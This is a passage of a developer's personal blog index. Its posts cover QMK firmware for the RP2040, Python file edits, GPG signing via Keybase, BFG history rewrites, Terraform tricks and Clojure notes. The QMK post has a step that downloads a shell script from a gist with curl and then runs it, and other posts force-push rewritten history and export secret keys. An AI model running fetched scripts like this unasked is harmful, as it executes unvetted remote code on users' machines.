shortage. Namely the atmega 32u4 chips that power the elite-c and pro micros microcontrollers that are at the centers of custom keyboards. It just so happened that during this time raspberry pi developed a microcontroller of their own. This is known as the rp2040. rp2040 Why does this matter? Well we can now get the 2040 as a drop in replacement for the pro micros. This is super helpful for the qmk world as they have been busy building the firmware for it. They have also been kind enough to build converters for it. so how do we build for it? At the time of the writing of this qmk has not merged this into the main branch, therefore for qmk we will want to checkout the develop branch and for the sadekbaroudi fork checkout develop_rp2040\n$ git checkout develop or $ git checkout develop_rp2040 Now we can go through and do the qmk install song and dance as outlined nicely by adafruit https://learn.adafruit.com/using-qmk-on-rp2040-microcontrollers or we can do the easier way and use docker. For docker we are going to hotwire the docker_build.sh script and use my version of that.\n# from inside the root of the qmk_firmware folder curl https://gist.githubusercontent.com/ridingintraffic/a872b990403b07b8b95a90e438dba529/raw/f893d70dfe447fc925a8fff1dbf5de507cc9cc7b/docker_build_hot.sh -o util/docker_build_hot.sh. \u0026amp;\u0026amp; chmod +x util/docker_build_hot.sh # then run it with ./util/docker_build_hot.sh nothing:nothing This will nicely drop us into the qmk container with all the proper deps installed. Additionally through some volume mounting of that script we will have access to all our local files inside the docker container. This is a two way mount, we will be able to write out files as well. This is important when we move to build the firmware later. Time to get to work. We will need to update the git-sudmodule because we are not on a release branch. This is done with:\nI have no name!@83ff02ad93ad:/qmk_firmware$ make git-submodule .... This will take a few minutes to clone and build everything that we need but its worth it. Once it is complete then we just build the firmware for the keyboard that we want to convert to rp2040 as follows.\n$ make crkbd:default CONVERT_TO=kb2040 When it is completed we will be left with a u2f file back in the root of the qmk_firmware folder, this is courtesy of the script and its volume mounts from above. Then set the 2040 into bootloader mode and copy the u2f to its proper home and have fun!\n","permalink":"https://ridingintraffic.github.io/posts/2022-08-04-rp2040/","summary":"player 2(040) has entered the game. During the past 2 years if you had not noticed, there has been a chip shortage. Namely the atmega 32u4 chips that power the elite-c and pro micros microcontrollers that are at the centers of custom keyboards. It just so happened that during this time raspberry pi developed a microcontroller of their own. This is known as the rp2040. rp2040 Why does this matter? Well we can now get the 2040 as a drop in replacement for the pro micros.","title":"Building QMK with Rp2040"},{"content":"We built microservices to leverage scale. As a result those microservices are each in their own repos. We don\u0026rsquo;t need to get into a discussion about mono repos here, we aren\u0026rsquo;t using them. The example here is a gitlab pipeline file and we needed to add a new yaml anchor block to use later in the pipeline. We are going to look for something that we know exists, in this case: \u0026ldquo;.plan\u0026rdquo; Then we are going to add a block of stuff before that. Its useful to think backwards here because most of the python tools out there search files line by line and then add the replacement before that line. A standard library that does this well is fileinput. This pattern allows you to pass in file by file and replace the text in each of those files. It is super helpful when you have changes spread across tons and tons of files\nfileinput doc\n#!/usr/bin/env python3 \u0026#34;\u0026#34;\u0026#34; this is a python script to look for a single line in a file then replace that line with many lines \u0026#34;\u0026#34;\u0026#34; import fileinput, sys to_be_replaced = \u0026#34;\u0026#34;\u0026#34;.plan:\u0026#34;\u0026#34;\u0026#34; replacement = \u0026#34;\u0026#34;\u0026#34;.vulnerability: \u0026amp;vulnerability - git clone git@gitlab.com:NOT_A_REAL_USER/gitlab-pipeline-scripts.git gitlab-pipeline-scripts/ - ./scripts/vulnerability-check.sh - for i in $(cat report-CRITICAL.json | jq -r .vulnerability_count); do if [[ $i != 0 ]]; then exit 1; fi done - for i in $(cat report-HIGH.json | jq -r .vulnerability_count); do if [[ $i != 0 ]]; then exit 1; fi done .plan:\u0026#34;\u0026#34;\u0026#34; for l in fileinput.input(files = sys.argv[1], mode=\u0026#39;rU\u0026#39;,inplace=True): l = l.replace(to_be_replaced, replacement) sys.stdout.write(l) ","permalink":"https://ridingintraffic.github.io/posts/2022-05-26-replacing-text-blocks/","summary":"We built microservices to leverage scale. As a result those microservices are each in their own repos. We don\u0026rsquo;t need to get into a discussion about mono repos here, we aren\u0026rsquo;t using them. The example here is a gitlab pipeline file and we needed to add a new yaml anchor block to use later in the pipeline. We are going to look for something that we know exists, in this case: \u0026ldquo;.","title":"replacing text across files"},{"content":"Github and gitlab both have online text editors. if you are in safari and you have a repo open for either of them. All you need to do is type the period key and they will pop full fledged web editors for you. with github you are actually getting vscode with gitlab you are getting their editor. this makes me miss github for my daily work environment. but i guess there is a gitlab plugin for vscode in the web. i guess i will have to play with it a little bit tomrorow and see what is what cause this is really cool.\nhttps://switchtoipad.com/features/how-to-use-visual-studio-code-on-your-ipad/\n","permalink":"https://ridingintraffic.github.io/posts/2022-04-27-vscode-github/","summary":"Github and gitlab both have online text editors. if you are in safari and you have a repo open for either of them. All you need to do is type the period key and they will pop full fledged web editors for you. with github you are actually getting vscode with gitlab you are getting their editor. this makes me miss github for my daily work environment. but i guess there is a gitlab plugin for vscode in the web.","title":"github vscode"},{"content":"Adding code . to your terminal in order to open vscode. I like to maintain a terminal session running with just about everything that I am working on in it. Usually I work in VIM but lately I have needed to use vscode for a number of things. I like being ale to clone or switch the repo I am working on from the terminal and then open an editor directly from there. This can be accomplish in vscode through a simple confguration addition.\nWith VS Code running, enter Command + Shift + P to open the Command Palette (or View \u0026gt; Command Palette from the menu bar) A search bar will open up. Search for “Shell” or “Shell Command” and you should see one named Shell Command: install \u0026#34;code\u0026#34; command in PATH. Once that is done then its a simple code . and a new vscode window will open with the folder contents in it.\nThanks for the tip shannon. install code to path\n","permalink":"https://ridingintraffic.github.io/posts/2022-03-14-vscode/","summary":"Adding code . to your terminal in order to open vscode. I like to maintain a terminal session running with just about everything that I am working on in it. Usually I work in VIM but lately I have needed to use vscode for a number of things. I like being ale to clone or switch the repo I am working on from the terminal and then open an editor directly from there.","title":"adding \u003cvs\u003ecode to path"},{"content":"Using repl to debug python.\nhttps://jvns.ca/blog/2021/09/16/debugging-in-a-repl-is-fun/\nwhat’s a REPL? REPL stands for “read eval print loop”. A REPL is a program that: reads some input from you like print(f\u0026#34;2 + 2 = {2+2}\u0026#34;) (read) evaluates the input (eval) print out the result (print) and then goes back to step 1 (loop) A couple years ago I used pry in ruby/chef a bunch and then I guess I forgot about it. Now this works for python too and it is WAY better than my print statement hell that I usually write.\nNeedless to say all you need to do in python is drop this one line in where you want to break and wam bam.\nimport ipdb; ipdb.set_trace() and then you get access to a REPL and you can interogate all your variables and write functions and whatever you want.\nSo simple, so clean.\nLet\u0026rsquo;s hope I don\u0026rsquo;t forget about it again.\n","permalink":"https://ridingintraffic.github.io/posts/2021-09-16-repl/","summary":"Using repl to debug python.\nhttps://jvns.ca/blog/2021/09/16/debugging-in-a-repl-is-fun/\nwhat’s a REPL? REPL stands for “read eval print loop”. A REPL is a program that: reads some input from you like print(f\u0026#34;2 + 2 = {2+2}\u0026#34;) (read) evaluates the input (eval) print out the result (print) and then goes back to step 1 (loop) A couple years ago I used pry in ruby/chef a bunch and then I guess I forgot about it. Now this works for python too and it is WAY better than my print statement hell that I usually write.","title":"python repl"},{"content":"Diffing with git Diffing with git is hard so I wrote an alias in order to make my life easier.\nalias git-diff-master=\u0026#39;git diff master...`git rev-parse --abbrev-ref HEAD`\u0026#39; Run that little alias and you are good to go when you need to check what you have changed.\nbye\n","permalink":"https://ridingintraffic.github.io/posts/2021-05-26-git-diff/","summary":"Diffing with git Diffing with git is hard so I wrote an alias in order to make my life easier.\nalias git-diff-master=\u0026#39;git diff master...`git rev-parse --abbrev-ref HEAD`\u0026#39; Run that little alias and you are good to go when you need to check what you have changed.\nbye","title":"git-diff"},{"content":"Format json in vim If you have jq installed then all you need to do, to pretty print json is.\n:%!jq \u0026#39;.\u0026#39; Bam pretty json in vim\n","permalink":"https://ridingintraffic.github.io/posts/2021-01-19-vim-jq/","summary":"Format json in vim If you have jq installed then all you need to do, to pretty print json is.\n:%!jq \u0026#39;.\u0026#39; Bam pretty json in vim","title":"vim-jq"},{"content":"I am borrowing this from pstadler because it is really good https://github.com/pstadler/keybase-gpg-github/blob/master/README.md\nSet up Keybase.io, GPG \u0026amp; Git to sign commits on GitHub This is a step-by-step guide on how to create a GPG key on keybase.io, adding it to a local GPG setup and use it with Git and GitHub.\nAlthough this guide was written for macOS, most commands should work in other operating systems as well.\nThere\u0026rsquo;s a video published by Timothy Miller explaining some parts of this guide. Discussion on Hacker News.\nNote: If you don\u0026rsquo;t want to use Keybase.io, follow this guide instead. For manually transferring keys to different hosts, check out this answer on Stack Overflow.\nRequirements 1 2 $ brew install gpg $ brew cask install keybase You should already have an account with Keybase and be signed in locally using $ keybase login. In case you need to set up a new device first, follow the instructions provided by the keybase command during login.\nMake sure your local version of Git is at least 2.0 ($ git --version) to automatically sign all your commits. If that\u0026rsquo;s not the case, use Homebrew to install the latest Git version: $ brew install git.\nCreate a new GPG key on keybase.io 1 2 3 4 5 6 7 8 9 10 11 12 $ keybase pgp gen --multi # Enter your real name, which will be publicly visible in your new key: Patrick Stadler # Enter a public email address for your key: patrick.stadler@gmail.com # Enter another email address (or \u0026lt;enter\u0026gt; when done): # Push an encrypted copy of your new secret key to the Keybase.io server? [Y/n] Y # ▶ INFO PGP User ID: Patrick Stadler \u0026lt;patrick.stadler@gmail.com\u0026gt; [primary] # ▶ INFO Generating primary key (4096 bits) # ▶ INFO Generating encryption subkey (4096 bits) # ▶ INFO Generated new PGP key: # ▶ INFO user: Patrick Stadler \u0026lt;patrick.stadler@gmail.com\u0026gt; # ▶ INFO 4096-bit RSA key, ID CB86A866E870EE00, created 2016-04-06 # ▶ INFO Exported new key to the local GPG keychain Set up Git to sign all commits 1 2 3 4 5 6 7 8 9 $ gpg --list-secret-keys --keyid-format LONG # /Users/pstadler/.gnupg/secring.gpg # ---------------------------------- # sec 4096R/E870EE00 2016-04-06 [expires: 2032-04-02] # uid Patrick Stadler \u0026lt;patrick.stadler@gmail.com\u0026gt; # ssb 4096R/F9E3E72E 2016-04-06 $ git config --global user.signingkey E870EE00 $ git config --global commit.gpgsign true Add public GPG key to GitHub 1 2 3 4 5 6 $ open https://github.com/settings/keys # Click \u0026#34;New GPG key\u0026#34; # We can then use `export` with the `-q` or query flag to match on our key (the first 16 characters should do..) $ keybase pgp export -q CB86A866E870EE00 | pbcopy # copy public key to clipboard # Paste key, save Import key to GPG on another host 1 2 3 4 5 6 7 8 9 10 $ keybase pgp export # ▶ WARNING Found several matches: # user: Patrick Stadler \u0026lt;patrick.stadler@gmail.com\u0026gt; # 4096-bit RSA key, ID CB86A866E870EE00, created 2016-04-06 # user: keybase.io/ps \u0026lt;ps@keybase.io\u0026gt; # 4096-bit RSA key, ID 31DBBB1F6949DA68, created 2014-03-26 $ keybase pgp export -q CB86A866E870EE00 | gpg --import $ keybase pgp export -q CB86A866E870EE00 --secret | gpg --allow-secret-key-import --import Troubleshooting: gpg failed to sign the data If you cannot sign a commit after running through the above steps, and have an error like:\n1 2 3 $ git commit -m \u0026#34;My commit\u0026#34; # error: gpg failed to sign the data # fatal: failed to write commit object You can run echo \u0026quot;test\u0026quot; | gpg --clearsign to find the underlying issue.\nIf the above succeeds without error, then there is likely a configuration problem that is preventing git from selecting or using the secret key. Confirm that your gitconfig user.email matches the secret key that you are using for signing.\nOptional: Set as default GPG key 1 2 3 $ $EDITOR ~/.gnupg/gpg.conf # Add line: default-key E870EE00 Optional: Fix for Git UIs If you use a UI such as Git Tower or Github Desktop, you may need to configure git to point to the specific gpg executable:\n1 git config --global gpg.program $(which gpg) Optional: Disable TTY If you have problems with making autosigned commits from IDE or other software add no-tty config\n1 2 3 $ $EDITOR ~/.gnupg/gpg.conf # Add line: no-tty Optional: Setting up TTY Depending on your personal setup, you might need to define the tty for gpg whenever your passphrase is prompted. Otherwise, you might encounter an Inappropriate ioctl for device error.\n1 2 3 4 $ $EDITOR ~/.profile # or other file that is sourced every time # Paste these lines GPG_TTY=$(tty) export GPG_TTY Optional: In case you\u0026rsquo;re prompted to enter the password every time Some people found that this works out of the box w/o following these steps.\nMethod 1 - gpg-agent + pinentry-mac Install pinentry-mac:\n1 $ brew install pinentry-mac Set up the agent:\n1 2 3 $ $EDITOR ~/.gnupg/gpg-agent.conf # Paste this line: pinentry-program /usr/local/bin/pinentry-mac Now git commit -S, it will ask your password and you can save it to macOS keychain.\nMethod 2 - GPG Suite Some people find that pinentry installed with brew does not allow the password to be saved to macOS\u0026rsquo;s keychain.\nIf you do not see \u0026ldquo;Save in Keychain\u0026rdquo; after following Method 1, first uninstall the version of pinentry-mac installed with brew:\n1 $ brew uninstall pinentry-mac Now install the GPG Suite versions, available from gpgtools.org, or from brew by running:\n1 $ brew cask install gpg-suite Once installed, open Spotlight and search for \u0026ldquo;GPGPreferences\u0026rdquo;, or open system preferences and select \u0026ldquo;GPGPreferences\u0026rdquo;\nSelect the Default Key if it is not already selected, and ensure \u0026ldquo;Store in OS X Keychain\u0026rdquo; is checked:\nThe gpg-agent.conf is different from Method 1:\nSet up the agent:\n1 2 3 4 $ $EDITOR ~/.gnupg/gpg-agent.conf # GPG Suite should pre-populate with something similar to the following: default-cache-ttl 600 max-cache-ttl 7200 ","permalink":"https://ridingintraffic.github.io/posts/2020-11-17-keybase-gpg-signing/","summary":"I am borrowing this from pstadler because it is really good https://github.com/pstadler/keybase-gpg-github/blob/master/README.md\nSet up Keybase.io, GPG \u0026amp; Git to sign commits on GitHub This is a step-by-step guide on how to create a GPG key on keybase.io, adding it to a local GPG setup and use it with Git and GitHub.\nAlthough this guide was written for macOS, most commands should work in other operating systems as well.\nThere\u0026rsquo;s a video published by Timothy Miller explaining some parts of this guide.","title":"keybase gpg signing"},{"content":"Help! I committed and pushed something dangerous to github This happens we are not perfect and from time to time mistakes are made. Thats ok we can fix it with bfg\ngit add my-bad-file git commit -a -m \u0026#34;im dumb\u0026#34; git push origin master # I did not mean to do that, I did not mean to do that # Lets fix it # i am in the repo folder named my-repo rm my-bad-file git commit -a -m \u0026#34;go away\u0026#34; git push origin master cd ../ bfg --delete-files my-bad-file my-repo/ # bfg runs things and does commits to the history # bfg will also remove that filename from all paths so make sure it isn\u0026#39;t reused cd my-repo git push origin master --force #we have to force because we have rewritten the history and git complains about the thing we did There we have it, simple enough but it is incredibly dangerous because you are rewriting git history, so be sure that you know what you are deleting\n","permalink":"https://ridingintraffic.github.io/posts/2020-11-12-bfg-delete-files/","summary":"Help! I committed and pushed something dangerous to github This happens we are not perfect and from time to time mistakes are made. Thats ok we can fix it with bfg\ngit add my-bad-file git commit -a -m \u0026#34;im dumb\u0026#34; git push origin master # I did not mean to do that, I did not mean to do that # Lets fix it # i am in the repo folder named my-repo rm my-bad-file git commit -a -m \u0026#34;go away\u0026#34; git push origin master cd .","title":"bfg -delete"},{"content":"pinentry is broken on my mac?! try this first\n# Kill gpg-agent killall gpg-agent # Run gpg-agent in daemon mode gpg-agent --daemon Universal handoff - clipboard mac/IOS There is a feature in mac land that allows you to share clipboard between phone and computer if they are both on the same wifi along with the same apple account. This can be super useful for a variety of applications.\nHere\u0026#39;s how to turn on Handoff on your devices: On your Mac: Choose Apple () menu \u0026gt; System Preferences, then click General. Select “Allow Handoff between this Mac and your iCloud devices.” On your iPhone, iPad, and iPod touch: Go to Settings \u0026gt; General \u0026gt; Handoff, then turn on Handoff. https://support.apple.com/en-us/HT209460\nTF destroy single resource Terraform is great but sometimes there are bugs with things, or sometimes you just need to make a thing go away. Specifically there was an issue with AWS api-gateway and a cycle loop that terraform would get in to, we needed to delete the resources without making a mess of terraform and the environment. How do you do this.\n# resource named aws.my-bad-resource terraform destroy -target aws.my-bad-resource # then it will ask for confirmation and delete it yey easy right? ","permalink":"https://ridingintraffic.github.io/posts/2020-11-11-tf-pinentry-gpg/","summary":"pinentry is broken on my mac?! try this first\n# Kill gpg-agent killall gpg-agent # Run gpg-agent in daemon mode gpg-agent --daemon Universal handoff - clipboard mac/IOS There is a feature in mac land that allows you to share clipboard between phone and computer if they are both on the same wifi along with the same apple account. This can be super useful for a variety of applications.\nHere\u0026#39;s how to turn on Handoff on your devices: On your Mac: Choose Apple () menu \u0026gt; System Preferences, then click General.","title":"terraform destroy gpg pinentry"},{"content":"AWS cli v2 input prompting Today I learned that there is an argument that you can pass to the aws cli and it will prompt you for the input for the command that you are trying to run. https://docs.aws.amazon.com/cli/latest/userguide/cli-usage-parameters-prompting.html\nIf you are using version 2 of the aws cli then just add --cli-auto-prompt to your command and it will make magic.\nThis is good if you don\u0026rsquo;t recall what you need to have in a command so it will just ask you along the way.\nTerraform remote state Lets just say that you are using tf.io and you have remote state stored there. If you go and do something dumb, and tf-apply using a higher version of terraform than your ci\\cd pipeline uses, the ci\\cd pipeline will either need to get updated to support the new version or you have a big mess on your hands. Fundamentally all that you need to do is update the tf version inside of your state file and you are good to go. This is explained a little bit here https://support.hashicorp.com/hc/en-us/articles/360001147287-Downgrading-Terraform\nThis is essentially just changing the version in the state file and then uploading it.\nHowever remotely hosted state files makes this a little bit harder to do. There is a great writeup here on how to handle it and step by step for all the proper fields that you will need to fix your shame.\nhttps://support.hashicorp.com/hc/en-us/articles/360041299873\n","permalink":"https://ridingintraffic.github.io/posts/2020-10-09-aws-terraform/","summary":"AWS cli v2 input prompting Today I learned that there is an argument that you can pass to the aws cli and it will prompt you for the input for the command that you are trying to run. https://docs.aws.amazon.com/cli/latest/userguide/cli-usage-parameters-prompting.html\nIf you are using version 2 of the aws cli then just add --cli-auto-prompt to your command and it will make magic.\nThis is good if you don\u0026rsquo;t recall what you need to have in a command so it will just ask you along the way.","title":"aws cli input and TF state file"},{"content":"Clojure again Welcome back to my clojure ramblings while I try to understand more.\nTonight we are going to pick up where we left off, and that has to do with Vectors.\nNOTE: I am writing this as a way to digest and understand the book that I am working through entitled. Living Clojure\nVectors Vectors can be found because they are wrapped in []\nuser=\u0026gt; [ :bucket 3 4 :cup ] [:bucket 3 4 :cup] user=\u0026gt; [:thing \u0026#34;other\u0026#34; :mine] [:thing \u0026#34;other\u0026#34; :mine] Vectors are similar to lists we can have a mix of types in them, and some of the same operators can be used on them. Such as first and rest\nuser=\u0026gt; (first [ :thing1 :thing2 ] ) :thing1 user=\u0026gt; (rest [ :thing1 :thing2 :thing3 ]) (:thing2 :thing3) However we get a bonus with vectors and that is \u0026ldquo;fast access\u0026rdquo;. We can take the vector and go to a specific point in the vector without having to iterate our way through. This is super usefull if we need to go to the 100th and 1000th place in the vector. We do that by using the nth\nuser=\u0026gt; (nth [:thing1 :thing2 :thing3 :thing4] 3) :thing4 Cool that means vectors can be super fast, I like that. Same thing with the last operator, I don\u0026rsquo;t want to know how many things I have, I just want to go to the end.\nuser=\u0026gt; (last [:thing1 :thing2 :thing3 :thing4] ) :thing4 These two operators are available to lists, however we will have to step through every element in the list before we get to the one that we want. This can be a very costly operation.\nBoth of these are collections, and the cool thing about collections in clojure is that they are immutable which means they original will always be the same. Because, everything is a function, when we try and do a thing to the data object function, we are not transmuting or changing the original, we are getting a new thing on top of it. This allows us to always know what the original is and always know all the steps in between.\nMaps Maps are rad, and they are powerful. They are another collection, and they are the key value pairs for clojure. Again, we can drop off the use of the commas, and never look back. Its ok I know that it is weird, but trust me it is better this way, we have cake.\nuser=\u0026gt; {:thing1 \u0026#34;is blue\u0026#34; :thing2 \u0026#34;is purple\u0026#34; :thing3 \u0026#34;is orange\u0026#34;} {:thing1 \u0026#34;is blue\u0026#34;, :thing2 \u0026#34;is purple\u0026#34;, :thing3 \u0026#34;is orange\u0026#34;} The maps also have a getter and a default value option that will populate if nothing is found. Lets take a look at those.\nuser=\u0026gt; (get {:thing1 \u0026#34;is blue\u0026#34; :thing2 \u0026#34;is purple\u0026#34; :thing3 \u0026#34;is orange\u0026#34;} :thing2) \u0026#34;is purple\u0026#34; user=\u0026gt; (get {:thing1 \u0026#34;is blue\u0026#34; :thing2 \u0026#34;is purple\u0026#34; :thing3 \u0026#34;is orange\u0026#34;} :thing4, \u0026#34;not found\u0026#34;) \u0026#34;not found\u0026#34; The same thing can be acheived by using the key as the function, which IMO is easier anyway.\nuser=\u0026gt; (:thing4 {:thing1 \u0026#34;is blue\u0026#34; :thing2 \u0026#34;is purple\u0026#34; :thing3 \u0026#34;is orange\u0026#34;} \u0026#34;not found\u0026#34;) \u0026#34;not found\u0026#34; user=\u0026gt; (:thing1 {:thing1 \u0026#34;is blue\u0026#34; :thing2 \u0026#34;is purple\u0026#34; :thing3 \u0026#34;is orange\u0026#34;} \u0026#34;not found\u0026#34;) \u0026#34;is blue\u0026#34; Then we have assoc and merge. assoc will update an existing key, however do not think of it as updating the key. Think of it as getting a new map with everything the same except the new value. Merge is how we are going to merge to maps together.\nuser=\u0026gt; (assoc {:one 1 } :one 2) {:one 2} user=\u0026gt; (merge {:one 1 :two 2} {:three 3 :four 4}) {:one 1, :two 2, :three 3, :four 4} Well I think that is about all that I can handle for tonight, I know that it doesn\u0026rsquo;t seem like I went very far, but it is something right?\n","permalink":"https://ridingintraffic.github.io/posts/2020-06-24-clojure-2/","summary":"Clojure again Welcome back to my clojure ramblings while I try to understand more.\nTonight we are going to pick up where we left off, and that has to do with Vectors.\nNOTE: I am writing this as a way to digest and understand the book that I am working through entitled. Living Clojure\nVectors Vectors can be found because they are wrapped in []\nuser=\u0026gt; [ :bucket 3 4 :cup ] [:bucket 3 4 :cup] user=\u0026gt; [:thing \u0026#34;other\u0026#34; :mine] [:thing \u0026#34;other\u0026#34; :mine] Vectors are similar to lists we can have a mix of types in them, and some of the same operators can be used on them.","title":"Clojure 2"},{"content":"UNI there is a handy little thing written in go that can handle unicode lookups from the terminal. I like all things terminal so here it is.\nhttps://github.com/arp242/uni\ngo get arp242.net/uni\nWhich will then allow you to search unicode from the terminal nice and easy uni search unicorn\nheadset control I use an arctis 7 for my work headset, it is pretty nice but since it is USB 2.4ghz it lacks some of the features up bluetooth.\nOne such feature is battery % in the taskbar.\nThis can be fixed by using a terminal app called \u0026ldquo;headsetcontrol\u0026rdquo; and combining it with my bitbar. https://github.com/Sapd/HeadsetControl Then add this script to the bitbar script folder.\n#!/bin/bash #headset.15m.sh HEADSET_BATTERY=$(/usr/local/bin/headsetcontrol -b -c) echo \u0026#34;🎧:$HEADSET_BATTERY%\u0026#34; Bitbar has no issues with the unicode for heaphones, it will output a nice cute little headphone icon.\nA bonus option of this is turning on the feature in the headset to dump your audio to the headset as well. This help modulate your voice level and or hear your surroundings if that is something that you want headsetcontrol -s 64 will give you 50% of the total mix.\n11:07 $ headsetcontrol -h Headsetcontrol written by Sapd (Denis Arnst) https://github.com/Sapd Parameters -s level Sets sidetone, level must be between 0 and 128 -b Checks the battery level -n soundid Makes the headset play a notifiation -l 0|1 Switch lights (0 = off, 1 = on) -c Cut unnecessary output -i time Sets inactive time in minutes, level must be between 0 and 90, 0 disables the feature. -m Retrieves the current chat-mix-dial level setting ","permalink":"https://ridingintraffic.github.io/posts/2020-09-21-uni/","summary":"UNI there is a handy little thing written in go that can handle unicode lookups from the terminal. I like all things terminal so here it is.\nhttps://github.com/arp242/uni\ngo get arp242.net/uni\nWhich will then allow you to search unicode from the terminal nice and easy uni search unicorn\nheadset control I use an arctis 7 for my work headset, it is pretty nice but since it is USB 2.4ghz it lacks some of the features up bluetooth.","title":"uni headsetcontrol"},{"content":"just some thoughts on places to eat in the future There are tons of good places to get bbq in chicago, but here are some top winners\nhttps://chicagoculinarykitchen.com/ bbq in the burbs is chicago culinary kitchen located at 773 N. Quentin Road Palatine, IL\nFood truck / small shop that makes meat and then closes up shop when they run out of it.\n","permalink":"https://ridingintraffic.github.io/posts/2020-09-18-bbq/","summary":"just some thoughts on places to eat in the future There are tons of good places to get bbq in chicago, but here are some top winners\nhttps://chicagoculinarykitchen.com/ bbq in the burbs is chicago culinary kitchen located at 773 N. Quentin Road Palatine, IL\nFood truck / small shop that makes meat and then closes up shop when they run out of it.","title":"BBQ"},{"content":"Fun with terraform Today there was a fun problem. We needed to have terraform interrogate the current state and then make a decision based on the current state. The use case specifically was the number of service instances on an ECS cluster. If every time a deployment were to happen we would reset the desired count back to the original, then we could lose track of the current number of instances that happened as a result of scaling actions taken based on the current load.\nHow do you do this?\nWell the nice thing about our world is there are likely a thousand different ways that we can solve this issue. Here is how we did it.\nWe create an \u0026ldquo;external resource\u0026rdquo; and then have a local taken the default value and the external value, do a max evaluation on that and output the result.\nSimple enough? ¯_(ツ)_/¯ sure why not. So how do you do it?\nStep 1: the external resouce: Terraform allows us to have a resource that will get its data from an external script that is accompolished by something like this.\ndata \u0026#34;external\u0026#34; \u0026#34;my-service\u0026#34; { program = [\u0026#34;bash\u0026#34;, \u0026#34;../scripts/ecs-cluster.sh\u0026#34;, \u0026#34;my-cluster\u0026#34;, \u0026#34;my-env\u0026#34;] } We have created a script folder outside of our terraform repo to hold these types of scripts, don\u0026rsquo;t forget to set the script as executable otherwise you\u0026rsquo;ll have a bad time. The script will take 2 arguements to allow the script to be reused across services and environments. We can then use that resource in a local like this. The example also includes a default value for the service and then our desired count from an already running service.\nlocals { service_count= 2 desired_count = \u0026#34;${max(local.service_count, \u0026#34;${data.external.my-service.result[\u0026#34;desired_count\u0026#34;]}\u0026#34;)}\u0026#34; } Step 2: the script This is tricky, is the cluster doesn\u0026rsquo;t exist yet as in the initial deploy then just running aws commands would yield an error and terraform barfs. In order to resolve this we will need to look at the actual return code from the aws cli command. When the cli errors it will give a resource not found message but it will also give a return code. We want to surpress the message and just hold on to the return code.\nYou can find information on return codes here return-codes For our case the only thing we care about is NOT 0\nFinally terraform wants the return from the string as strings and not numbers, the aws cli will return a number, therefore we will \u0026ldquo;tostring\u0026rdquo; it to get what we need.\n#!/usr/bin/env bash ## ./ecs-cluster.sh service-name env service=$1 environment=$2 json=$(aws ecs describe-services --services $service --cluster $service-$environment 2\u0026gt;/dev/null) if [ $? != 0 ] then echo \u0026#34;{\\\u0026#34;desired_count\\\u0026#34;: \\\u0026#34;0\\\u0026#34; }\u0026#34; else echo $json | jq -r \u0026#39;{desired_count: .services[0].desiredCount | tostring}\u0026#39; fi Profit There you have it terraform can infer state on something already existing and pass that configuration back in to the plan and make sure that state is not lost. Hurray\n","permalink":"https://ridingintraffic.github.io/posts/2020-07-08-terraform-external/","summary":"Fun with terraform Today there was a fun problem. We needed to have terraform interrogate the current state and then make a decision based on the current state. The use case specifically was the number of service instances on an ECS cluster. If every time a deployment were to happen we would reset the desired count back to the original, then we could lose track of the current number of instances that happened as a result of scaling actions taken based on the current load.","title":"Terraform external"},{"content":"More Clojure Welcome back again. Last time we ended with assoc and dissoc. Tonight we will start with Sets.\nNOTE: I am writing this as a way to digest and understand the book that I am working through entitled. Living Clojure\nSets What is a set? Sets are collections without duplicates and can be denoted with #{} Because of the nature of the set, we get a few extra methods to use on them, union difference and intersection. This can be accessed by doing a prefix of clojure.set Lets take a look at simply creating some sets.\nuser=\u0026gt; #{:one :two :three} #{:one :three :two} user=\u0026gt; #{:one :two :two :three} Syntax error reading source at (REPL:2:25). Duplicate key: :two user=\u0026gt; #{\u0026#34;one\u0026#34; \u0026#34;two\u0026#34; \u0026#34;three\u0026#34;} #{\u0026#34;three\u0026#34; \u0026#34;two\u0026#34; \u0026#34;one\u0026#34;} user=\u0026gt; #{\u0026#34;one\u0026#34; \u0026#34;two\u0026#34; \u0026#34;two\u0026#34; \u0026#34;three\u0026#34;} Syntax error reading source at (REPL:3:29). Duplicate key: two user=\u0026gt; Simple enough right? Alright lets see about using some of those methods I mentioned. Something to keep in mind, if we are using the basic REPL then we are going to need to require and load in the library before we can use it.\nuser=\u0026gt; (require \u0026#39;[clojure.set]) nil user=\u0026gt; (clojure.set/union #{1 2 3} #{2 3 4}) #{1 4 3 2} user=\u0026gt; The union is going to merge set1 and set2 and give us back a set of all the unique keys.\nuser=\u0026gt; (require \u0026#39;[clojure.set]) nil user=\u0026gt; (clojure.set/difference #{1 2 3} #{2 3 4}) #{1} user=\u0026gt; The difference method when passed set1 and set2 is going to give the values that are not a part of set2, that exist in set1 This can be visualized much like \u0026ldquo;subtraction\u0026rdquo; in math land.\nuser=\u0026gt; (require \u0026#39;[clojure.set]) nil [Auser=(clojure.set/intersection #{1 2 3} #{2 3 4}) #{3 2} user=\u0026gt; The intersection method is going to return the values that are present in both sets.\nIf we would like to use these methods on things that are not sets, then we can convert other things in to sets pretty easily. First lets take a vector and turn it in to a set and then do things to it.\nuser=\u0026gt; (require \u0026#39;[clojure.set]) nil user=\u0026gt; (clojure.set/union (set [1 2 3 ]) (set [2 3 4 5 ]))) #{1 4 3 2 5} What about getting something out of a set? We can do that with a get, if the element is a keyword. There is also some nice things that we can do like includes to get boolean information back out.\nuser=\u0026gt; (get #{:one :two :three} :three) :three user=\u0026gt; (get #{:one :two :three} :four) nil user=\u0026gt; (:onet #{:one :two :three}) nil user=\u0026gt; (:one #{:one :two :three}) :one user=\u0026gt; ( #{:one :two :three}:two) :two user=\u0026gt; user=\u0026gt; ( contains? #{:one :two :three} :two) true Alright that is going to wrap up this round because with that I am done with the basic data structures in clojure.\nExtra bite When I was looking around for a good explanation about what functional programming is I came across a good side by side explanation of it. Lets take a look. wikipedia functional programming \u0026hellip;multiply all even numbers in an array by 10 and add them all, storing the final sum in the variable \u0026ldquo;result\u0026rdquo;. Traditional Imperative Loop:\nconst numList = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10] let result = 0; for (let i = 0; i \u0026lt; numList.length; i++) { if (numList[i] % 2 === 0) { result += (numList[i] * 10) } } Functional Programming with higher-order functions:\nconst numList = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10] const result = numList .filter(n =\u0026gt; n % 2 === 0) .map(a =\u0026gt; a * 10) .reduce((a, b) =\u0026gt; a + b) ","permalink":"https://ridingintraffic.github.io/posts/2020-06-27-clojure-3/","summary":"More Clojure Welcome back again. Last time we ended with assoc and dissoc. Tonight we will start with Sets.\nNOTE: I am writing this as a way to digest and understand the book that I am working through entitled. Living Clojure\nSets What is a set? Sets are collections without 